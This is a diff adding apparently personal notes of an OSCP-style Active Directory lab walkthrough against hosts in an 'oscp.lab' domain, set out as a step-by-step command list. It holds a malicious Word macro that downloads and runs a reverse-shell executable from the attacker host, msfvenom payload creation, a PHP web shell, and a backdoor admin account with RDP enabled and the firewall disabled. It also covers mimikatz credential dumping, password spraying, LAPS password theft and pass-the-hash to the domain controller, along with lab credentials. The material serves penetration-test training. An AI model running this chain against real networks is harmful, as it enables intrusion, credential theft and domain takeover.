@@ -1,0 +1,468 @@
+Path # 3
+
+Make sure to watch Derron C's video and give him the credit that he deserves: https://www.youtube.com/watch?v=Q5D2Yjc-RVc
+
+VPN:
+
+cd Desktop
+mkdir ad
+cd ad
+mkdir vpn
+mkdir ms01
+mkdir ms02
+mkdir dc01
+ll
+
+cd vpn
+mv ~/Downloads/profile.ovpn .
+ll
+sudo OpenVPN *.ovpn
+
+--------------------------------------
+
+cd Desktop/ad/ms01
+mkdir enu files loot exploits
+touch creds users passwords hashes
+
+nmap -Pn -v -p- 192.168.100.201 -oN enu/nmap-ports.log
+(Ports 80 and 443 are open)
+
+nmap -Pn -v -p80,443 -sVC 192.168.100.201 -oN enu/nmap-versions.log
+(Port 80/443 is running "Apache httpd 2.4.58". Port 80 has an http-title: "File Upload Form")
+
+gobuster dir -u http://192.168.100.201 -r -w /usr/share/wordlists/dirb/common.txt | tee enu/gobuster-p80.log
+grep -v 403 enu/gobuster-p80.log
+(Everything except code 403)
+(We find that port 80/443 has an uploads directory)
+firefox http://192.168.100.201/uploads
+(We don't find any files of interest)
+
+gobuster dir -u http://192.168.100.201 -r -w /usr/share/wordlists/dirb/big.txt | tee enu/gobuster-p80-big.log
+gobuster dir --help | grep -i cert
+gobuster dir -u https://192.168.100.201 -r -k -w /usr/share/wordlists/dirb/big.txt | tee enu/gobuster-p443-big.log
+curl http://192.168.100.201
+(We found a file upload form - index.html, referencing an "upload.php" file. It's also accepting .doc files.)
+curl http://192.168.100.201/upload.php
+(No results!)
+
+touch test1.txt
+touch test2.doc
+echo 'this is a test2' > test2.doc
+
+firefox http://192.168.100.201
+(We are not able to upload the .txt file. But we are able to upload the file with the .doc extension, despite the fact it isn't a real .doc file. It's not looking for magic bytes)
+
+cat test2.doc
+cat ~/Downloads/test2.doc
+diff test2.doc ~/Downloads/test2.doc
+(The file we uploaded is the same)
+
+--------------------------------------------------
+
+Reverse Shell Macro:
+
+Create a 1997-2003 .doc file with the following macro added:
+
+Sub AutoOpen()
+ revshell
+End Sub1
+
+Sub Document_Open()
+ revshell1
+End Sub
+
+Sub revshell1()
+'
+' revshell1 Macro
+'
+ Dim StrCmd As String
+ StrCmd = "certutil.exe -f -urlcache http://172.16.11.11/winrev443.exe winrev443.exe"
+ CreateObject("Wscript.Shell").Run StrCmd
+ Dim StrCmd2 As String
+ StrCmd2 = "powershell.exe -nop .\winrev443.exe"
+ CreateObject("Wscript.Shell").Run StrCmd2
+End Sub
+
+
+Save the macro and close the word doc.
+(Also see video for an alternative macro that can be used)
+
+cd Desktop/ad/ms01
+cploits
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.11.11 LPORT=443 -f exe -o winrev443.exe
+python -m http.server -p 80
+nc -nvlp 443
+
+Now upload the word doc)
+(After a while we get a reverse shell as a local user!)
+hostname
+whoami /all
+(We have the ability to shutdown).
+
+dir
+del *.doc
+del *.exe
+tree /F \xampp\htdocs
+(For some reason the .exe could not be deleted. But that's fine).
+
+
+
+-----
+
+WinPEAS
+
+cd ~/Desktop/ad/
+mkdir stage
+cd stage
+mv ~/Downloads/winPEASx64.exe .
+python -m http.server -d . 80
+
+cd \Users
+dir
+whoami
+dir stuart
+(We are not able to see into stuart's profile, because we aren't local admin)
+net user
+cd public
+dir
+certutilexe -f -urlcache http://172.16.11.11/winPEASx64.exe winpeas.exe
+winpeas.exe
+(Winpeas provided Watson component. If we don't find anything during manual enumeration, we can try these vulnerabilities)
+(We see "LAPS (Local Administrator Password Services) Settings" which is not normal. So make a note.)
+(NTLM Settings is only NTLMv2. Therefore, if we capture a hash, we need to crack it. We will not be able to pass it.)
+(LADMIN is a local administrator)
+(Kevin has auto-logon set. That's why we got the reverse shell as Kevin.)
+
+cd \xampp
+dir
+type passwords.txt
+(This only has default passwords. Not helpful under normal circumstances.)
+dir htdocs
+cd htdocs
+cacls .
+(Authenticated Users has ID permissions. Meaning we might be able to add our own code in this directory.)
+copy index.html index2.html
+(We are able to write files! This means we can create our own web content on the backend and execute it from the frontend. So we can create a web shell and invoke it from Kali.)
+
+sc query
+(This gives us too much output)
+
+powershell.exe -ex bypass
+Get-CimInstance-ClassName win32_service 
+(That comes back with our services)
+Get-Service Apache2.4
+Get-CimInstance -ClassName CIM_Service
+(We broke it! :< )
+(We need to get the reverse shell again)
+nc -nvlp 443
+cd ..\
+dir
+del index2.html
+dir
+
+-----------------------------------------
+Webshell
+cat /usr/share/webshells/php/simple-backdoor.php
+cp /usr/share/webshells/php/simple-backdoor.php ~/Desktop/ad/stage
+
+certutil.exe -f -urlcache http://172.16.11.11/simple-backdoor.php simple.php
+
+firefox http://192.168.100.201/simple.php
+firefox http://192.168.100.201/simple.php?cmd=whoami
+(We are NT Authority\SYSTEM)
+curl http://192.168.100.201.simple.php
+curl http://192.168.100.201.simple.php?cmd=dir
+
+-----------------------------------------------------------------------------------------------
+
+PERSISTENCE:
+
+curl http://192.168.100.201.simple.php?cmd=uploads\\winrev443.exe
+(Note we had to double backslash because we're running this command in the bash shell)
+nc -nvlp 443
+whoami
+(We now have a shell as NT Authority\SYSTEM)
+hostname
+dir /s/b \proof.txt
+dir /s/b \local.txt
+
+net user /add backdoor Password123
+net localgroup Administrators /add backdoor
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
+netsh advfirewall set allprofiles state off
+xfreerdp /v:192.168.100.201 /u:backdoor /d:ms01 /p:Password123 +clipboard /cert:ignore
+whoami /all
+
+
+--------------------------------------------------------------------------------------------
+
+PIVOTING:
+
+cd ~/Desktop/ad/stage
+ll
+mv ~/Downloads/* .
+ll
+rm test2.doc
+unzip ligolo-ng_agent_0.4.4_windows_amd64.zip
+rm *.zip LICENSE README.md
+ll
+tar -xvf ligolo-ng_agent_0.4.4_linux_amd64.zip
+rm *.zip LICENSE README.md
+sudo mv -f proxy /usr/bin/
+cd ~/Desktop/ad
+sudo ip tuntap add user kali mode tun ligolo
+set ip link set ligolo up
+route
+ip route
+sudo ip route add 10.10.1.0/24 dev ligolo
+ip route
+proxy -selfcert
+
+impacket-smb2server -smb2support stage .
+
+In Windows Explorer:
+\\172.16.11.11\stage
+
+Copy agent.exe and paste it into "C:\Users\Public"
+
+cd ..\public
+dir
+agent.exe -connect 172.16.11.11:11601 -retry -ignore-cert
+
+session
+1
+start
+
+ping -c 2 10.10.1.200
+(It is best practice to ping the domain controller because it should have ICMP ports open)
+ping -c 2 10.10.1.202
+(Unsuccessful. Firewall must be on.)
+
+Open a command prompt (in the GUI session) with Administrator access:
+whoami /all
+cd \Users
+dir
+dir stuart
+tree /F stuart
+cls
+dir /s/b c:\*.pdf
+dir /s/b c:\*.kdbx
+dir /s/b c:\*.zip
+dir /s/b c:\*.doc*
+whoami /all
+dir /A C:\$Recycle.Bin\
+dir /A C:\$Recycle.Bin\S-1-5-21-3902119089-3194977123-834544202-1003\
+type /A C:\$Recycle.Bin\S-1-5-21-3902119089-3194977123-834544202-1003\$I8I1KV.doc
+(We find that Stuart deleted a file named "welcome letter.doc")
+copy C:\$Recycle.Bin\S-1-5-21-3902119089-3194977123-834544202-1003\$I8I1KV.doc "C:\Users\Public\welcome_letter.doc"
+(When we attempt to open the word doc, we find that it's password protected)
+cd C:\Users\Public
+dir
+sudo systemctl start ssh
+scp welcome_letter.doc kali@172.16.11.11:/home/kali/Desktop/ad/ms01/files
+
+cd /home/kali/Desktop/ad/ms01/files
+ll
+office2john welcome_letter.doc > welcome_letter.doc.hash
+cat welcome_letter.doc.hash
+john --help | grep -i wordlist
+john welcome_letter.doc.hash --wordlists=/usr/share/wordlists/rockyou.txt
+john welcome_letter.doc.hash --wordlists=/usr/share/wordlists/rockyou.txt --rules
+john welcome_letter.doc.hash
+
+Open the welcome_letter.doc file with the password.
+
+We find the credentials:
+Username: minions
+Password: B4nan@!!!
+
+We also found: help@oscp.ab (oscp\help ?)
+
+
+-----------------------------------------------------------------------------------------
+
+Nmap Scan the LAN Subnet:
+
+crackmapexec smb 10.10.1.200
+(This fingerprints the OS. We see the hostname is DC01. This is the domain controller).
+
+cd ~/Desktop/ad/dc01
+mkdir enu loot files exploits
+sudo nmap -Pn -v -p- -sCV --open 10.10.1.200 -oN enu/nmap-ports.log
+(Port 53, 88, 135, 139, 389, 445, 5040, 49668 open)
+
+cd ~/Desktop/ad/ms02
+mkdir enu loot files exploits
+sudo nmap -Pn -v -p- -sCV --open 10.10.1.202 -oN enu/nmap-ports.log
+(Port 135, 139, 445, 3389, 5040, and 49668 are open)
+
+
+------------------------------
+
+Password Spraying
+
+impacket-smbserver -smb2support stage .
+
+
+xfreerdp /v:192.168.100.201 /u:backdoor /d:ms01 /p:Password123 +clipboard /cert:ignore
+
+In Windows Explorer:
+\\172.16.11.11\stage
+
+Copy mimikatz.exe to "C:\Users\Public\"
+
+cd "C:\Users\Public\"
+.\mimikatz.exe
+log
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::lsa /inject
+Open the log file and Control-F "username"
+(We located Kevin's, Stuart's, and LADMIN's NTLM hash!)
+
+vim hashes
+(
+<ntlm hash>
+<ntlm hash>
+<ntlm hash>
+)
+
+
+vim users
+(
+minions
+stuart
+kevin
+LADMIN
+)
+
+crackmapexec smb 10.10.1.200-10.10.1.202
+crackmapexec smb 10.10.1.200-10.10.1.202 -u users -p passwords --continue-on-success
+crackmapexec smb 10.10.1.200-10.10.1.202 -u users -H hashes --continue-on-success
+
+crackmapexec winrm 10.10.1.200-10.10.1.202
+crackmapexec winrm 10.10.1.200-10.10.1.202 -u users -H hashes --continue-on-success
+crackmapexec winrm 10.10.1.200-10.10.1.202 -u users -p passwords --continue-on-success
+
+-------------------------------
+
+SharpHound
+
+Download several versions
+
+cd ~/Desktop/ad/stage
+mv ~/Downloads/SharpHound-v* .
+
+In Windows Explorer:
+\\172.16.11.11\stage
+Copy the SharpHound files to C:\Users\Public
+
+Open Command Prompt
+
+whoami
+runas /user:oscp\minions cmd.exe
+cd C:\Users\Public
+cd SharpHound-v2.0.2
+SharpHound.exe -c All --domain oscp.lab --zipfilename sharp202.zip
+cd ..\SharpHound-v1.1.1
+SharpHound.exe -c All --domain oscp.lab --zipfilename sharp111.zip
+
+sudo apt update
+sudo apt install -y neo4j bloodhound
+
+
+Paste the ZIP files into the smb2support share.
+
+(In Kali)
+neo4jstart
+Use "neo4j" and "neo4j" for username and password and set a password
+bloodhound
+Use "neo4j" and the password you just set it to.
+
+Upload the ZIP file
+After the upload is complete, click "Analysis" and click "Show Domain Admins"
+Mark relevant principals as "Owned"
+"Shortest Path to Domain Admins from Owned Principles"
+"Shortest Path from Owned Principals"
+Click on the user to show the "Node Info"
+Look for non-default GPOs
+You can right click on the line "ReadLAPSPassword" in the graph. It will give you commands you can run to abuse the vulnerability.
+
+Download pyLAPS
+cd ~/Desktop/ad/ms02/exploits
+mv ~/Downloads/pyLAPS.py .
+python pyLAPS.py
+python pyLAPS.py --action get -d "oscp.lab" -u minions -p "B4nan@\!\!\!"
+(We've requested and retrieved the local admin passwords for MS01 and MS02)
+68J++X&%pz@Aj1
+Hd)vj]I#4}W6B5
+
+impacket-psexec ms02\LADMIN@10.10.1.202
+(REJECTED!)
+runas /user:ms01\LADMIN cmd.exe
+whoami /all
+
+Click "First Degree Admin Control"
+Minions has ForceChangePassword for Lucy and Dr Nefario
+net rpc password "lucy" -U "oscp"/"minions"%"B4nan@!!!" -S "10.10.1.200"
+net rpc password "dr_nefario" -U "oscp"/"minions"%"B4nan@!!!" -S "10.10.1.200"
+Mark "lucy" and "dr_nefario" as owned principles
+
+Add "Password123@" to your "passwords" file
+Add "lucy" and "dr_nefario" to the "users" file
+
+crackmapexec smb 10.10.1.202 -u users -p passwords --continue-on-success
+(Successful Authentication: dr_nefario:Password123@ and lucy:Password123@)
+
+crackmapexec smb 10.10.1.202 -u users -p passwords --shares
+crackmapexec rdp 10.10.1.202 -u users -p passwords --continue-on-success
+hydra -L users -P passwords rdp://10.10.1.202
+
+xfreerdp /v:10.10.1.202 /u:lucy /d:oscp /p:Password123@ +clipboard /cert:ignore
+whoami /all
+runas /user:ms01\LADMIN cmd.exe
+whoami
+net user LADMIN
+Open CMD as an Administrator and enter LADMIN password for MS02
+
+net user /add backdoor Password123
+net localgroup Administrators /add backdoor
+
+Transfer SharpHound.exe to MS02 and run it as LADMIN
+Transfer the zip files back to Kali and load them in BloodHound
+Click "Direct Members". Mark the users as owned who have been owned.
+Click "Shortest Path to Domain Admins from Owned Principals"
+
+Go to "C:\Users"
+(GRU has a logon)
+
+In BloodHound, mark GRU as owned (just to see if we would be able to get domain admin if we compromise GRU)
+You can also run: "net user GRU /domain" to see they're a domain admin.
+
+In File Explorer: Copy mimikatz.exe from the "stage" drive over to C:\Users\Public on MS02
+
+cd C:\Users\Public
+.\mimikatz.exe
+privilege::debug
+log
+lsadump::lsa /inject
+sekurlsa::logonpasswords
+
+Open the log file and Control-F "username"
+(We located GRU's NTLM hash!)
+
+Add GRU's hash to the "hashes" file
+
+hashcat hashes /usr/share/wordlists/rockyou.txt -m 1000
+hashcat hashes /usr/share/wordlists/rockyou.txt -m 1000 -r /usr/share/hashcat/rules/best64.rule
+(We were unable to crack the DA hash :< )
+
+sudo nmap -Pn -v -p445 10.10.1.200
+
+impacket-psexec -hashes :42hjk1hk341jh2314hk1jlk234 gru@10.10.1.200
+whoami
+(We are Domain Admin!)
+hostname
+cd \users\
+cd administrator
+cd desktop
